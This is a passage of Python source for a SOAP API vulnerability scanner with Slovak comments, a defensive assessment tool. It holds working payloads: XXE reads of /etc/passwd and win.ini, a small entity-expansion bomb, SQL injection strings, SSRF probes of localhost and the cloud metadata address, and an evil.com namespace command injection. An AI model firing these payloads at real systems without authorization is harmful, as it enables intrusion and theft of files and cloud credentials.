import re
import time
from urllib.parse import urlparse
from ptlibs.ptprinthelper import ptprint


class SoapScanner:
    """Modul pre bezpečnostné testovanie SOAP API služieb.

    Testy:
      Pôvodné:
        - WSDL Exposure (PTV-SOAP-WSDL-EXPOSED)
        - XXE Injection (PTV-XML-XXE)
        - SOAPAction Spoofing (PTV-SOAP-ACTION-SPOOFING)
        - Information Disclosure (PTV-SOAP-VERBOSE-ERRORS, PTV-GEN-PATH-LEAK, PTV-SOAP-TECH-DISCLOSURE)
        - WS-Security Replay Protection (PTV-SOAP-REPLAY-RISK)
        - Rate Limiting (PTV-GEN-NO-RATE-LIMIT)
        - Insecure Transport (PTV-GEN-INSECURE-TRANSPORT)

      Nové:
        - XML Bomb / Billion Laughs DoS (PTV-XML-BOMB)
        - SQL Injection cez SOAP parametre (PTV-SOAP-SQLI)
        - SOAP Injection / XML Injection (PTV-SOAP-XML-INJECTION)
        - SSRF cez SOAP parametre (PTV-SOAP-SSRF)
        - Chýbajúce bezpečnostné hlavičky (PTV-GEN-MISSING-HEADERS)
    """

    MAX_BACKOFF_RETRIES = 2
    BACKOFF_SECONDS = 11

    def __init__(self, session, args, ptjsonlib):
        self.session = session
        self.args = args
        self.jsonlib = ptjsonlib
        self.node_key = None
        self.base_url = f"{urlparse(self.args.url).scheme}://{urlparse(self.args.url).netloc}"
        self.endpoint_url = self.args.url
        self.wsdl_content = ""
        self.wsdl_url = ""

    def _safe_post(self, url, data, headers=None, timeout=None):
        """POST s automatickým retry pri HTTP 429."""
        if timeout is None:
            timeout = self.args.timeout
        try:
            r = self.session.post(url, data=data, headers=headers,
                                  timeout=timeout, verify=False)
            if r.status_code == 429:
                ptprint(f"Rate limit hit, backing off {self.BACKOFF_SECONDS}s...",
                        "INFO", condition=not self.args.json)
                time.sleep(self.BACKOFF_SECONDS)
                r = self.session.post(url, data=data, headers=headers,
                                      timeout=timeout, verify=False)
            return r
        except Exception as e:
            ptprint(f"Request failed: {e}", "WARNING", condition=not self.args.json)
            return None

    def _safe_get(self, url, timeout=None):
        """GET s error handlingom."""
        if timeout is None:
            timeout = self.args.timeout
        try:
            return self.session.get(url, timeout=timeout, verify=False)
        except Exception as e:
            ptprint(f"GET request failed: {e}", "WARNING", condition=not self.args.json)
            return None

    def run(self):
        """Spustí všetky bezpečnostné testy."""
        self.resolve_target_endpoint()

        node = self.jsonlib.create_node_object("soap_api", {"url": self.endpoint_url})
        self.node_key = node.get("key")
        self.jsonlib.add_node(node)

        if not self.endpoint_url.lower().startswith("https"):
            self.jsonlib.add_vulnerability("PTV-GEN-INSECURE-TRANSPORT",
                                           node_key=self.node_key)
            ptprint("Insecure Transport (HTTP).", "VULN",
                    condition=not self.args.json, colortext=True)

        # Pôvodné testy
        self.test_wsdl_exposure()
        self.test_xxe()
        self.test_soap_action_spoofing()
        self.test_information_disclosure()
        self.test_replay_protection()

        # Nové testy
        self.test_xml_bomb()
        self.test_sql_injection()
        self.test_soap_injection()
        self.test_ssrf()
        self.test_security_headers()

        # Rate limit ako posledný
        self.test_rate_limiting()

    # =========================================================================
    # WSDL Resolution
    # =========================================================================

    def resolve_target_endpoint(self):
        ptprint("Resolving SOAP endpoint from WSDL...", "INFO",
                condition=not self.args.json)

        wsdl_candidates = list(filter(None, [
            self.args.url if "wsdl" in self.args.url.lower() else None,
            self.args.url.rstrip('/') + "?wsdl",
            self.args.url.rstrip('/') + "?WSDL",
            self.base_url + "/?wsdl",
            self.args.url,
            self.base_url + "/",
        ]))

        seen = set()
        unique = []
        for url in wsdl_candidates:
            n = url.rstrip('/')
            if n not in seen:
                seen.add(n)
                unique.append(url)

        for wsdl_url in unique:
            r = self._safe_get(wsdl_url)
            if r is None or r.status_code != 200:
                continue

            content_type = r.headers.get("Content-Type", "").lower()
            body_lower = r.text.lower()

            is_xml = "xml" in content_type or body_lower.lstrip().startswith("<?xml")
            has_wsdl = "definitions" in body_lower or "wsdl:" in body_lower

            if not (is_xml and has_wsdl):
                continue

            self.wsdl_content = r.text
            self.wsdl_url = wsdl_url

            address_patterns = [
                r'<[\w:]*address\s+location\s*=\s*["\']([^"\']+)["\']',
                r'location\s*=\s*["\']([^"\']+)["\']',
            ]

            for pattern in address_patterns:
                match = re.search(pattern, r.text, re.IGNORECASE)
                if match:
                    extracted_url = match.group(1)
                    if not extracted_url.startswith("http"):
                        extracted_url = (self.base_url.rstrip('/') + '/'
                                         + extracted_url.lstrip('/'))

                    # OPRAVA: Ak WSDL obsahuje localhost/127.0.0.1 ale my testujeme
                    # vzdialený server, nahradíme hostname za skutočný cieľ.
                    # Toto je bežný problém — vývojári zabudnú zmeniť adresu v WSDL.
                    extracted_parsed = urlparse(extracted_url)
                    target_parsed = urlparse(self.args.url)

                    extracted_host = extracted_parsed.hostname or ""
                    target_host = target_parsed.hostname or ""

                    is_localhost = extracted_host in ("localhost", "127.0.0.1", "::1")
                    is_remote_target = target_host not in ("localhost", "127.0.0.1", "::1", "")

                    if is_localhost and is_remote_target:
                        # Nahradíme localhost za skutočný cieľový host:port
                        fixed_url = extracted_url.replace(
                            f"{extracted_parsed.scheme}://{extracted_parsed.netloc}",
                            self.base_url
                        )
                        ptprint(f"WSDL contains localhost endpoint: {extracted_url}",
                                "WARNING", condition=not self.args.json)
                        ptprint(f"Remapped to actual target: {fixed_url}",
                                "INFO", condition=not self.args.json)
                        self.endpoint_url = fixed_url
                    else:
                        self.endpoint_url = extracted_url

                    ptprint(f"Resolved endpoint: {self.endpoint_url}",
                            "INFO", condition=not self.args.json)
                    return

            ptprint("WSDL found but no explicit endpoint address.",
                    "INFO", condition=not self.args.json)
            return

    # =========================================================================
    # PÔVODNÉ TESTY
    # =========================================================================

    def test_wsdl_exposure(self):
        ptprint("Checking for WSDL exposure...", "INFO", condition=not self.args.json)

        if not self.wsdl_content:
            wsdl_paths = [
                self.endpoint_url.rstrip('/') + "?wsdl",
                self.base_url + "/?wsdl",
                self.base_url + "/",
            ]
            for path in wsdl_paths:
                r = self._safe_get(path)
                if r and r.status_code == 200:
                    ct = r.headers.get("Content-Type", "").lower()
                    body_lower = r.text.lower()
                    if ("xml" in ct or body_lower.lstrip().startswith("<?xml")):
                        if "definitions" in body_lower:
                            self.wsdl_content = r.text
                            self.wsdl_url = path
                            break

        if self.wsdl_content:
            namespace = re.search(r'targetNamespace="([^"]+)"', self.wsdl_content)
            ns_text = namespace.group(1) if namespace else "unknown"
            operations = re.findall(r'<\w*:?operation\s+name="([^"]+)"', self.wsdl_content)
            op_count = len(operations)

            evidence = f"WSDL accessible at {self.wsdl_url}. Namespace: {ns_text}"
            if operations:
                evidence += f". Operations exposed ({op_count}): {', '.join(operations[:10])}"

            self.jsonlib.add_vulnerability("PTV-SOAP-WSDL-EXPOSED",
                                           node_key=self.node_key,
                                           data={"evidence": evidence})
            ptprint(f"WSDL exposure confirmed ({op_count} operations).", "VULN",
                    condition=not self.args.json, colortext=True)
        else:
            ptprint("No WSDL exposure detected.", "OK",
                    condition=not self.args.json)

    def test_xxe(self):
        ptprint("Testing for XXE vulnerability...", "INFO",
                condition=not self.args.json)

        payloads = [
            {
                "name": "SOAP Body /etc/passwd",
                "data": (
                    '<?xml version="1.0" encoding="utf-8"?>'
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                    '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
                    '<soapenv:Header/><soapenv:Body><test>&xxe;</test></soapenv:Body>'
                    '</soapenv:Envelope>'
                ),
                "indicators": ["root:x:", "root:*:", "daemon:", "nobody:"],
            },
            {
                "name": "SOAP <message> /etc/passwd",
                "data": (
                    '<?xml version="1.0" encoding="utf-8"?>'
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                    '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"'
                    ' xmlns:tns="urn:examples:helloservice">'
                    '<soapenv:Header/><soapenv:Body>'
                    '<tns:message>&xxe;</tns:message>'
                    '</soapenv:Body></soapenv:Envelope>'
                ),
                "indicators": ["root:x:", "root:*:", "daemon:", "nobody:"],
            },
            {
                "name": "Plain XML <message> /etc/passwd",
                "data": (
                    '<?xml version="1.0" encoding="utf-8"?>'
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                    '<root><message>&xxe;</message></root>'
                ),
                "indicators": ["root:x:", "root:*:", "daemon:", "nobody:"],
            },
            {
                "name": "SOAP Body C:/Windows/win.ini",
                "data": (
                    '<?xml version="1.0" encoding="utf-8"?>'
                    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>'
                    '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
                    '<soapenv:Header/><soapenv:Body><message>&xxe;</message></soapenv:Body>'
                    '</soapenv:Envelope>'
                ),
                "indicators": ["[fonts]", "[extensions]", "[files]"],
            },
        ]

        for p in payloads:
            r = self._safe_post(self.endpoint_url, data=p["data"],
                                headers={"Content-Type": "text/xml"})
            if r is None:
                continue

            for indicator in p["indicators"]:
                if indicator in r.text:
                    snippet = r.text[:200].strip().replace('\n', ' ')
                    ptprint(f"XXE vulnerability detected ({p['name']})!",
                            "VULN", condition=not self.args.json, colortext=True)
                    self.jsonlib.add_vulnerability(
                        "PTV-XML-XXE", node_key=self.node_key,
                        data={"evidence": f"Payload: {p['name']}. Response snippet: {snippet}"}
                    )
                    return

            dtd_errors = ["disallowed", "external entity", "dtd", "entity"]
            if any(err in r.text.lower() for err in dtd_errors):
                ptprint(f"DTD processing detected but restricted ({p['name']}).",
                        "INFO", condition=not self.args.json)

        ptprint("Server appears safe from XXE.", "OK",
                condition=not self.args.json)

    def test_soap_action_spoofing(self):
        ptprint("Testing SOAPAction Spoofing...", "INFO",
                condition=not self.args.json)

        soap_body = (
            '<?xml version="1.0" encoding="utf-8"?>'
            '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
            '<soapenv:Header/><soapenv:Body>'
            '<message>probe_test</message>'
            '</soapenv:Body></soapenv:Envelope>'
        )

        r_normal = self._safe_post(self.endpoint_url, data=soap_body,
                                    headers={"Content-Type": "text/xml; charset=utf-8"})
        r_spoofed = self._safe_post(self.endpoint_url, data=soap_body,
                                     headers={"Content-Type": "text/xml; charset=utf-8",
                                              "SOAPAction": '"urn:SPOOFED:NonExistent"'})

        if r_normal is None or r_spoofed is None:
            ptprint("Could not complete SOAPAction test.", "INFO",
                    condition=not self.args.json)
            return

        rejection_keywords = [
            "soapaction", "unrecognized action", "action mismatch",
            "invalid action", "operation not found", "unknown method",
            "not implemented", "action is not valid",
        ]

        spoofed_rejected = (
            r_spoofed.status_code in [400, 403, 404, 405, 500] and
            any(kw in r_spoofed.text.lower() for kw in rejection_keywords)
        )

        if spoofed_rejected:
            ptprint("SOAPAction is properly validated.", "OK",
                    condition=not self.args.json)
            return

        spoofed_same_response = (
            r_spoofed.status_code == r_normal.status_code and
            abs(len(r_spoofed.text) - len(r_normal.text)) < 50
        )

        if spoofed_same_response:
            ptprint("SOAPAction Spoofing possible (header ignored)!", "VULN",
                    condition=not self.args.json, colortext=True)
            self.jsonlib.add_vulnerability(
                "PTV-SOAP-ACTION-SPOOFING", node_key=self.node_key,
                data={"evidence": (
                    f"Normal status: {r_normal.status_code}, "
                    f"Spoofed status: {r_spoofed.status_code}. "
                    "Server does not validate SOAPAction header."
                )}
            )
        else:
            ptprint("SOAPAction spoofing not confirmed.", "OK",
                    condition=not self.args.json)

    def test_information_disclosure(self):
        ptprint("Testing for information disclosure...", "INFO",
                condition=not self.args.json)

        test_payloads = [
            ("Invalid XML", "THIS_IS_NOT_VALID_XML_<>!@#"),
            ("Malformed SOAP", '<?xml version="1.0"?><soap:Envelope><BROKEN'),
            ("Empty body", ""),
        ]

        found_vulns = []

        for name, payload in test_payloads:
            r = self._safe_post(self.endpoint_url, data=payload,
                                headers={"Content-Type": "text/xml"})
            if r is None:
                continue

            body = r.text
            body_lower = body.lower()

            verbose_patterns = [
                "traceback", "stack trace", "syntax error", "parse error",
                "at line", "exception in", "fatal error", "internal error",
                "system.web", "server error in", "unhandled exception",
                "object reference not set", "nullreferenceexception",
                "php on line", "warning:", "notice:", "debug",
                "lxml", "xmlsyntaxerror",
            ]
            matched_errors = [p for p in verbose_patterns if p in body_lower]
            if matched_errors:
                evidence_snippet = body[:200].strip().replace('\n', ' ')
                found_vulns.append(("PTV-SOAP-VERBOSE-ERRORS",
                                    f"Trigger: {name}. Patterns: {matched_errors}. "
                                    f"Snippet: {evidence_snippet}"))

            linux_path_re = r"/(?:var|etc|home|usr|tmp|app|opt|srv|bin|lib|root)(?:/[a-zA-Z0-9._-]+)+"
            windows_path_re = r"[a-zA-Z]:\\(?:[^\\\/:*?\"<>|\r\n]+\\)+"
            path_match = re.search(linux_path_re, body) or re.search(windows_path_re, body)
            if path_match and len(path_match.group(0)) > 8:
                found_vulns.append(("PTV-GEN-PATH-LEAK",
                                    f"Internal path leaked: {path_match.group(0)}"))

            tech_patterns = {
                "server": r.headers.get("Server", ""),
                "x-powered-by": r.headers.get("X-Powered-By", ""),
                "x-aspnet-version": r.headers.get("X-AspNet-Version", ""),
            }
            for header_name, header_val in tech_patterns.items():
                if header_val:
                    found_vulns.append(("PTV-SOAP-TECH-DISCLOSURE",
                                        f"Header '{header_name}: {header_val}'"))

        reported_codes = set()
        for vuln_code, evidence in found_vulns:
            if vuln_code not in reported_codes:
                reported_codes.add(vuln_code)
                ptprint(f"Information disclosure: {vuln_code}", "VULN",
                        condition=not self.args.json, colortext=True)
                self.jsonlib.add_vulnerability(vuln_code, node_key=self.node_key,
                                               data={"evidence": evidence})

        if not found_vulns:
            ptprint("No information disclosure detected.", "OK",
                    condition=not self.args.json)

    def test_replay_protection(self):
        ptprint("Checking WS-Security replay protection...", "INFO",
                condition=not self.args.json)

        soap_request = (
            '<?xml version="1.0" encoding="utf-8"?>'
            '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
            '<soapenv:Header/><soapenv:Body>'
            '<message>replay_check</message>'
            '</soapenv:Body></soapenv:Envelope>'
        )

        r = self._safe_post(self.endpoint_url, data=soap_request,
                            headers={"Content-Type": "text/xml; charset=utf-8",
                                     "SOAPAction": '""'})

        if r is None:
            ptprint("Could not complete replay protection test.", "INFO",
                    condition=not self.args.json)
            return

        ws_security_indicators = [
            "timestamp", "nonce", "wsse:security", "wsu:timestamp",
            "wsse:nonce", "created", "expires", "security", "wss4j",
        ]

        has_protection = any(ind in r.text.lower() for ind in ws_security_indicators)

        if not has_protection:
            r2 = self._safe_post(self.endpoint_url, data=soap_request,
                                 headers={"Content-Type": "text/xml; charset=utf-8",
                                          "SOAPAction": '""'})
            if r2 and r.status_code == r2.status_code:
                ptprint("Missing WS-Security replay protection.", "VULN",
                        condition=not self.args.json, colortext=True)
                self.jsonlib.add_vulnerability(
                    "PTV-SOAP-REPLAY-RISK", node_key=self.node_key,
                    data={"evidence": "No Timestamp/Nonce/WS-Security elements in response. "
                                      "Identical requests accepted without replay rejection."})
            else:
                ptprint("Replay protection inconclusive.", "INFO",
                        condition=not self.args.json)
        else:
            ptprint("WS-Security replay protection detected.", "OK",
                    condition=not self.args.json)

    # =========================================================================
    # NOVÉ TESTY
    # =========================================================================

    def test_xml_bomb(self):
        """Testuje odolnosť voči XML Bomb / Billion Laughs útoku (DoS).

        Posiela malý XML payload, ktorý sa expanduje na obrovský objem dát.
        Ak server odpovedá normálne alebo veľmi pomaly, nie je chránený.
        Bezpečný server odmietne spracovanie alebo vráti chybu.
        """
        ptprint("Testing XML Bomb (Billion Laughs) resistance...", "INFO",
                condition=not self.args.json)

        # Zmenšený Billion Laughs — len 3 úrovne expanzie (bezpečné pre test)
        # Expanduje na ~1000 znakov, nie gigabajty — nechceme zhodiť server
        bomb_payload = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE lolz ['
            '  <!ENTITY lol "lol">'
            '  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
            '  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">'
            ']>'
            '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
            '<soapenv:Body><message>&lol3;</message></soapenv:Body>'
            '</soapenv:Envelope>'
        )

        start_time = time.time()
        r = self._safe_post(self.endpoint_url, data=bomb_payload,
                            headers={"Content-Type": "text/xml"}, timeout=15)
        elapsed = time.time() - start_time

        if r is None:
            # Timeout alebo crash — server môže byť zraniteľný
            if elapsed >= 14:
                ptprint("XML Bomb caused timeout — possible DoS vulnerability!", "VULN",
                        condition=not self.args.json, colortext=True)
                self.jsonlib.add_vulnerability(
                    "PTV-XML-BOMB", node_key=self.node_key,
                    data={"evidence": f"Server timed out after {elapsed:.1f}s processing nested entity expansion."})
            else:
                ptprint("XML Bomb test inconclusive (connection error).", "INFO",
                        condition=not self.args.json)
            return

        body_lower = r.text.lower()

        # Bezpečný server by mal odmietnuť entity expansion
        rejection_indicators = [
            "entity", "expansion", "too many", "billion laughs",
            "dtd", "disallowed", "not allowed", "recursive",
        ]

        if any(ind in body_lower for ind in rejection_indicators):
            ptprint("Server correctly rejected entity expansion.", "OK",
                    condition=not self.args.json)
            return

        # Server spracoval bomb bez chyby — expandoval entity
        # Kontrola: ak odpoveď obsahuje "lol" viacnásobne, entity sa expandovali
        lol_count = r.text.count("lol")
        if lol_count > 20:
            ptprint(f"XML Bomb processed — entity expanded ({lol_count}x 'lol')!", "VULN",
                    condition=not self.args.json, colortext=True)
            self.jsonlib.add_vulnerability(
                "PTV-XML-BOMB", node_key=self.node_key,
                data={"evidence": f"Server expanded nested entities ({lol_count}x 'lol' in response). "
                                  f"Response time: {elapsed:.1f}s. Vulnerable to Billion Laughs DoS."})
        elif elapsed > 5:
            ptprint(f"XML Bomb caused slow response ({elapsed:.1f}s) — possible vulnerability.", "VULN",
                    condition=not self.args.json, colortext=True)
            self.jsonlib.add_vulnerability(
                "PTV-XML-BOMB", node_key=self.node_key,
                data={"evidence": f"Response time {elapsed:.1f}s (vs normal <1s). "
                                  "Server may be vulnerable to XML entity expansion DoS."})
        else:
            ptprint("Server appears resistant to XML Bomb.", "OK",
                    condition=not self.args.json)

    def test_sql_injection(self):
        """Testuje SQL Injection cez SOAP parametre.

        Posiela bežné SQL injection payloady v SOAP <message> elemente
        a kontroluje, či odpoveď obsahuje databázové chybové hlášky.
        """
        ptprint("Testing for SQL Injection...", "INFO",
                condition=not self.args.json)

        sqli_payloads = [
            ("Single quote", "' OR '1'='1"),
            ("Double quote", '" OR "1"="1'),
            ("Comment break", "admin'--"),
            ("Union select", "' UNION SELECT NULL,NULL--"),
            ("Sleep (time-based)", "' OR SLEEP(3)--"),
        ]

        # Najprv pošleme normálny request pre baseline odpoveď
        normal_soap = (
            '<?xml version="1.0"?>'
            '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
            '<soapenv:Body><message>normaluser123</message></soapenv:Body>'
            '</soapenv:Envelope>'
        )
        r_baseline = self._safe_post(self.endpoint_url, data=normal_soap,
                                      headers={"Content-Type": "text/xml"})

        sql_error_indicators = [
            "sql syntax", "sqlite3", "mysql", "postgresql", "ora-",
            "microsoft sql", "syntax error", "unclosed quotation",
            "unterminated string", "operationalerror", "sqlexception",
            "jdbc", "odbc", "database error", "query failed",
            "sqlite_", "pg_query", "mysql_fetch",
        ]

        for name, sqli_value in sqli_payloads:
            soap_payload = (
                '<?xml version="1.0"?>'
                '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
                f'<soapenv:Body><message>{sqli_value}</message></soapenv:Body>'
                '</soapenv:Envelope>'
            )

            start = time.time()
            r = self._safe_post(self.endpoint_url, data=soap_payload,
                                headers={"Content-Type": "text/xml"})
            elapsed = time.time() - start

            if r is None:
                continue

            body_lower = r.text.lower()

            # Kontrola databázových chýb v odpovedi
            matched = [ind for ind in sql_error_indicators if ind in body_lower]
            if matched:
                snippet = r.text[:200].strip().replace('\n', ' ')
                ptprint(f"SQL Injection indicator ({name})!", "VULN",
                        condition=not self.args.json, colortext=True)
                self.jsonlib.add_vulnerability(
                    "PTV-SOAP-SQLI", node_key=self.node_key,
                    data={"evidence": f"Payload: {name} ({sqli_value}). "
                                      f"DB errors: {matched}. Snippet: {snippet}"})
                return

            # Time-based detection — ak SLEEP payload spôsobí oneskorenie
            if "sleep" in name.lower() and elapsed > 2.5:
                ptprint(f"Time-based SQL Injection possible ({elapsed:.1f}s delay)!", "VULN",
                        condition=not self.args.json, colortext=True)
                self.jsonlib.add_vulnerability(
                    "PTV-SOAP-SQLI", node_key=self.node_key,
                    data={"evidence": f"Time-based: SLEEP payload caused {elapsed:.1f}s delay "
                                      f"(baseline <1s). Possible blind SQL injection."})
                return

        ptprint("No SQL Injection detected.", "OK",
                condition=not self.args.json)

    def test_soap_injection(self):
        """Testuje SOAP/XML Injection — vloženie XML metaznakov do parametrov.

        Ak server nezabezpečuje vstup, útočník môže zmeniť štruktúru
        SOAP správy a vykonať neautorizované operácie.
        """
        ptprint("Testing for SOAP/XML Injection...", "INFO",
                condition=not self.args.json)

        # Normálny request pre porovnanie
        normal_soap = (
            '<?xml version="1.0"?>'
            '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
            '<soapenv:Body><message>testuser</message></soapenv:Body>'
            '</soapenv:Envelope>'
        )
        r_normal = self._safe_post(self.endpoint_url, data=normal_soap,
                                    headers={"Content-Type": "text/xml"})

        # XML injection — pokus o uzavretie tagu a vloženie nového elementu
        injection_payloads = [
            {
                "name": "Tag break + new element",
                "data": (
                    '<?xml version="1.0"?>'
                    '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
                    '<soapenv:Body><message>test</message>'
                    '<admin>true</admin>'
                    '</soapenv:Body></soapenv:Envelope>'
                ),
            },
            {
                "name": "CDATA injection",
                "data": (
                    '<?xml version="1.0"?>'
                    '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
                    '<soapenv:Body><message><![CDATA[<script>alert(1)</script>]]></message>'
                    '</soapenv:Body></soapenv:Envelope>'
                ),
            },
            {
                "name": "Namespace injection",
                "data": (
                    '<?xml version="1.0"?>'
                    '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"'
                    ' xmlns:evil="http://evil.com">'
                    '<soapenv:Body><message>test</message>'
                    '<evil:command>whoami</evil:command>'
                    '</soapenv:Body></soapenv:Envelope>'
                ),
            },
        ]

        for p in injection_payloads:
            r = self._safe_post(self.endpoint_url, data=p["data"],
                                headers={"Content-Type": "text/xml"})
            if r is None:
                continue

            body_lower = r.text.lower()

            # Indikátory, že injekcia bola spracovaná
            # (server akceptoval neočakávané elementy bez odmietnutia)
            if r_normal and r.status_code == 200 and r_normal.status_code == r.status_code:
                # Server akceptoval injektovaný XML rovnako ako normálny
                if "admin" in body_lower and "true" in body_lower:
                    ptprint(f"SOAP Injection accepted ({p['name']})!", "VULN",
                            condition=not self.args.json, colortext=True)
                    self.jsonlib.add_vulnerability(
                        "PTV-SOAP-XML-INJECTION", node_key=self.node_key,
                        data={"evidence": f"Payload: {p['name']}. "
                                          "Server processed injected XML elements."})
                    return

            # Ak CDATA s XSS sa objaví v odpovedi nefiltrovane
            if "<script>" in r.text or "alert(1)" in r.text:
                ptprint(f"SOAP Injection — XSS in response ({p['name']})!", "VULN",
                        condition=not self.args.json, colortext=True)
                self.jsonlib.add_vulnerability(
                    "PTV-SOAP-XML-INJECTION", node_key=self.node_key,
                    data={"evidence": f"Payload: {p['name']}. "
                                      "CDATA/script content reflected in response without sanitization."})
                return

            # Ak server spracoval príkaz z injektovaného namespace
            if "whoami" in body_lower and ("root" in body_lower or "www-data" in body_lower):
                ptprint(f"SOAP Injection — command executed ({p['name']})!", "VULN",
                        condition=not self.args.json, colortext=True)
                self.jsonlib.add_vulnerability(
                    "PTV-SOAP-XML-INJECTION", node_key=self.node_key,
                    data={"evidence": f"Payload: {p['name']}. "
                                      "Injected namespace command was executed."})
                return

        # Kontrola schema validácie — ak server akceptuje ľubovoľné elementy
        # bez XSD validácie, je to slabý indikátor
        extra_elem_soap = (
            '<?xml version="1.0"?>'
            '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
            '<soapenv:Body><message>test</message>'
            '<unexpectedElement>data</unexpectedElement>'
            '</soapenv:Body></soapenv:Envelope>'
        )
        r_extra = self._safe_post(self.endpoint_url, data=extra_elem_soap,
                                   headers={"Content-Type": "text/xml"})
        if r_extra and r_normal:
            if r_extra.status_code == r_normal.status_code and r_extra.status_code != 400:
                ptprint("Server accepts unexpected XML elements (no schema validation).",
                        "VULN", condition=not self.args.json, colortext=True)
                self.jsonlib.add_vulnerability(
                    "PTV-SOAP-XML-INJECTION", node_key=self.node_key,
                    data={"evidence": "Server accepted SOAP message with unexpected elements "
                                      "without rejection. Missing XSD schema validation."})
                return

        ptprint("No SOAP/XML Injection detected.", "OK",
                condition=not self.args.json)

    def test_ssrf(self):
        """Testuje Server-Side Request Forgery (SSRF) cez SOAP parametre.

        Ak server spracováva URL zo SOAP parametrov (napr. pri importe,
        callback, alebo WSDL resolution), útočník môže donútiť server
        urobiť request na interné zdroje.
        """
        ptprint("Testing for SSRF indicators...", "INFO",
                condition=not self.args.json)

        # SSRF test 1: DTD z externej URL (ak server resolvuje externé entity)
        ssrf_xxe_payload = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo [<!ENTITY ssrf SYSTEM "http://127.0.0.1:22">]>'
            '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
            '<soapenv:Body><message>&ssrf;</message></soapenv:Body>'
            '</soapenv:Envelope>'
        )

        start = time.time()
        r = self._safe_post(self.endpoint_url, data=ssrf_xxe_payload,
                            headers={"Content-Type": "text/xml"}, timeout=10)
        elapsed = time.time() - start

        if r is not None:
            body_lower = r.text.lower()

            # Ak server kontaktoval localhost:22, môže vrátiť SSH banner alebo timeout
            ssrf_indicators = [
                "ssh-", "openssh", "connection refused", "connection reset",
                "refused to connect", "errno", "timeout", "could not connect",
            ]
            matched = [ind for ind in ssrf_indicators if ind in body_lower]

            if matched:
                ptprint(f"SSRF indicators detected (server tried internal connection)!", "VULN",
                        condition=not self.args.json, colortext=True)
                self.jsonlib.add_vulnerability(
                    "PTV-SOAP-SSRF", node_key=self.node_key,
                    data={"evidence": f"Entity resolution to http://127.0.0.1:22 returned "
                                      f"connection indicators: {matched}. "
                                      f"Server resolves external entities to internal resources."})
                return

        # SSRF test 2: WSDL import z internej URL
        ssrf_wsdl_payload = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo [<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
            '<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
            '<soapenv:Body><message>&ssrf;</message></soapenv:Body>'
            '</soapenv:Envelope>'
        )

        r2 = self._safe_post(self.endpoint_url, data=ssrf_wsdl_payload,
                             headers={"Content-Type": "text/xml"}, timeout=10)

        if r2 is not None:
            # AWS metadata indicators
            aws_indicators = ["ami-id", "instance-id", "local-ipv4", "public-ipv4",
                              "security-credentials", "iam"]
            if any(ind in r2.text.lower() for ind in aws_indicators):
                ptprint("SSRF — cloud metadata accessible!", "VULN",
                        condition=not self.args.json, colortext=True)
                self.jsonlib.add_vulnerability(
                    "PTV-SOAP-SSRF", node_key=self.node_key,
                    data={"evidence": "Entity resolution accessed AWS metadata endpoint "
                                      "(http://169.254.169.254/). Cloud credentials may be exposed."})
                return

        ptprint("No SSRF indicators detected.", "OK",
                condition=not self.args.json)

    def test_security_headers(self):
        """Kontroluje prítomnosť dôležitých bezpečnostných HTTP hlavičiek.

        Chýbajúce hlavičky nie sú priamo exploitovateľné, ale naznačujú
        nedostatočnú bezpečnostnú konfiguráciu servera.
        """
        ptprint("Checking security headers...", "INFO",
                condition=not self.args.json)

        # Pošleme normálny request
        r = self._safe_post(self.endpoint_url,
                            data='<?xml version="1.0"?><soapenv:Envelope '
                                 'xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">'
                                 '<soapenv:Body><message>headercheck</message></soapenv:Body>'
                                 '</soapenv:Envelope>',
                            headers={"Content-Type": "text/xml"})

        if r is None:
            ptprint("Could not complete security headers check.", "INFO",
                    condition=not self.args.json)
            return

        # Kontrola HTTPS-only hlavičiek
        important_headers = {
            "Strict-Transport-Security": "HSTS — ochrana proti downgrade na HTTP",
            "Content-Security-Policy": "CSP — ochrana proti XSS",
            "X-Content-Type-Options": "Ochrana proti MIME type sniffing",
            "X-Frame-Options": "Ochrana proti clickjacking",
        }

        # CORS hlavička — kontrola, či nie je príliš otvorená
        cors_header = r.headers.get("Access-Control-Allow-Origin", "")

        missing_headers = []
        for header, description in important_headers.items():
            if header not in r.headers:
                missing_headers.append(f"{header} ({description})")

        if missing_headers or cors_header == "*":
            evidence_parts = []
            if missing_headers:
                evidence_parts.append(f"Missing headers: {'; '.join(missing_headers)}")
            if cors_header == "*":
                evidence_parts.append("CORS is wildcard (*) — allows any origin")

            evidence = ". ".join(evidence_parts)
            ptprint(f"Missing security headers ({len(missing_headers)} missing).", "VULN",
                    condition=not self.args.json, colortext=True)
            self.jsonlib.add_vulnerability(
                "PTV-GEN-MISSING-HEADERS", node_key=self.node_key,
